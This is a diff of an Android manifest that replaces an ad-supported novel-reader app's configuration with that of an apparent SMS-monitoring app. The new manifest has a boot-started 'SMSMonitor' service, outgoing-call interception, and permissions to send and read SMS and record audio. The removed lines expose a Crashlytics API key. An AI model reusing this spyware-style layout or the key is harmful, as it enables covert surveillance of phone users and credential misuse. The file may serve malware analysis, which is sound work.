@@ -1,105 +1,35 @@
-<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.novel.reader" platformBuildVersionCode="25" platformBuildVersionName="7.1.1">
-    <uses-permission android:name="android.permission.INTERNET"/>
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
-    <permission android:name="com.novel.reader.pushnotification.permission.C2D_MESSAGE" android:protectionLevel="signature"/>
-    <uses-permission android:name="com.novel.reader.pushnotification.permission.C2D_MESSAGE"/>
-    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
-    <uses-permission android:name="com.android.vending.BILLING"/>
-    <meta-data android:name="android.support.VERSION" android:value="25.3.1"/>
-    <uses-permission android:name="android.permission.WAKE_LOCK"/>
-    <permission android:name="com.novel.reader.permission.C2D_MESSAGE" android:protectionLevel="signature"/>
-    <uses-permission android:name="com.novel.reader.permission.C2D_MESSAGE"/>
-    <application android:allowBackup="true" android:icon="@drawable/app_icon" android:label="@string/app_name" android:name="com.analytics.NovelReaderAnalyticsApp" android:theme="@style/AppTheme" android:windowSoftInputMode="adjustPan">
-        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
-        <activity android:label="@string/app_name" android:name="com.novel.reader.MainActivity" android:theme="@style/AppTheme.NoActionBar" android:windowSoftInputMode="adjustPan">
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.gambler.SendSMS">
+    <application android:debuggable="false" android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:label="@string/app_name" android:name=".MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
-                <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
             <intent-filter>
-                <action android:name="android.intent.action.SEARCH"/>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+                <category android:name="android.intent.category.DEFAULT"/>
             </intent-filter>
-            <meta-data android:name="android.app.searchable" android:resource="@xml/searchable"/>
         </activity>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.CategoryActivity" android:windowSoftInputMode="adjustPan">
+        <service android:name="SMSMonitor">
             <intent-filter>
-                <action android:name="android.intent.action.SEARCH"/>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+                <category android:name="android.intent.category.DEFAULT"/>
             </intent-filter>
-            <meta-data android:name="android.app.searchable" android:resource="@xml/searchable"/>
-        </activity>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.NovelIntroduceActivity" android:windowSoftInputMode="adjustPan">
-            <intent-filter>
-                <action android:name="android.intent.action.SEARCH"/>
-            </intent-filter>
-            <meta-data android:name="android.app.searchable" android:resource="@xml/searchable"/>
-        </activity>
-        <activity android:configChanges="keyboardHidden|orientation" android:hardwareAccelerated="false" android:name="com.novel.reader.ArticleActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.SettingActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.DonateActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.SearchActivity" android:windowSoftInputMode="adjustPan">
-            <intent-filter>
-                <action android:name="android.intent.action.SEARCH"/>
-            </intent-filter>
-            <meta-data android:name="android.app.searchable" android:resource="@xml/searchable"/>
-        </activity>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.BookmarkActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.DownloadActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.MyNovelActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.MyDownloadArticleActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation" android:name="com.novel.reader.NovelContentsActivity"/>
-        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="com.google.android.gms.ads.AdActivity" android:theme="@android:style/Theme.Translucent"/>
-        <activity android:configChanges="keyboard|keyboardHidden|navigation|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:hardwareAccelerated="true" android:name="com.vpadn.widget.VpadnActivity" android:theme="@android:style/Theme.Translucent"/>
-        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.mopub.mobileads.MoPubActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.mopub.mobileads.MraidActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.mopub.common.MoPubBrowser"/>
-        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.mopub.mobileads.MraidVideoPlayerActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.mopub.mobileads.RewardedMraidActivity"/>
-        <service android:name="com.novel.reader.service.DownloadService"/>
-        <service android:name="com.novel.reader.service.CollectNovelsService">
+        </service>
+        <receiver android:name=".StartBroadcastReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
-        </service>
-        <activity android:label="@string/title_activity_novel_recommend" android:name="com.novel.reader.NovelRecommendActivity"/>
-        <meta-data android:name="com.crashlytics.ApiKey" android:value="061f74624449122730ac6789bc4ae591c8701a7c"/>
-        <service android:name="com.google.android.gms.analytics.CampaignTrackingService"/>
-        <receiver android:exported="true" android:name="com.google.android.gms.analytics.CampaignTrackingReceiver">
-            <intent-filter>
-                <action android:name="com.android.vending.INSTALL_REFERRER"/>
-            </intent-filter>
         </receiver>
-        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.adbert.AdbertActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
-        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.adbert.AdbertInterstitialActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"/>
-        <activity android:name="com.mobfox.sdk.interstitialads.InterstitialActivity"/>
-        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.facebook.ads.AudienceNetworkActivity"/>
-        <activity android:configChanges="keyboard|keyboardHidden|navigation|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:hardwareAccelerated="true" android:name="com.taiwanmobile.pt.adp.view.TWMAdActivity" android:theme="@android:style/Theme.Translucent"/>
-        <activity android:excludeFromRecents="true" android:exported="false" android:name="com.google.android.gms.auth.api.signin.internal.SignInHubActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
-        <service android:exported="true" android:name="com.google.android.gms.auth.api.signin.RevocationBoundService" android:permission="com.google.android.gms.auth.api.signin.permission.REVOCATION_NOTIFICATION"/>
-        <activity android:name="com.google.android.gms.ads.purchase.InAppPurchaseActivity" android:theme="@style/Theme.IAPTheme"/>
-        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
-        <receiver android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementReceiver"/>
-        <receiver android:enabled="true" android:name="com.google.android.gms.measurement.AppMeasurementInstallReferrerReceiver" android:permission="android.permission.INSTALL_PACKAGES">
-            <intent-filter>
-                <action android:name="com.android.vending.INSTALL_REFERRER"/>
-            </intent-filter>
-        </receiver>
-        <service android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementService"/>
-        <receiver android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" android:permission="com.google.android.c2dm.permission.SEND">
-            <intent-filter>
-                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
-                <action android:name="com.google.android.c2dm.intent.REGISTRATION"/>
-                <category android:name="com.novel.reader"/>
-            </intent-filter>
-        </receiver>
-        <receiver android:exported="false" android:name="com.google.firebase.iid.FirebaseInstanceIdInternalReceiver"/>
-        <service android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdService">
-            <intent-filter android:priority="-500">
-                <action android:name="com.google.firebase.INSTANCE_ID_EVENT"/>
-            </intent-filter>
-        </service>
-        <provider android:authorities="com.novel.reader.firebaseinitprovider" android:exported="false" android:initOrder="100" android:name="com.google.firebase.provider.FirebaseInitProvider"/>
     </application>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="false"/>
 </manifest>
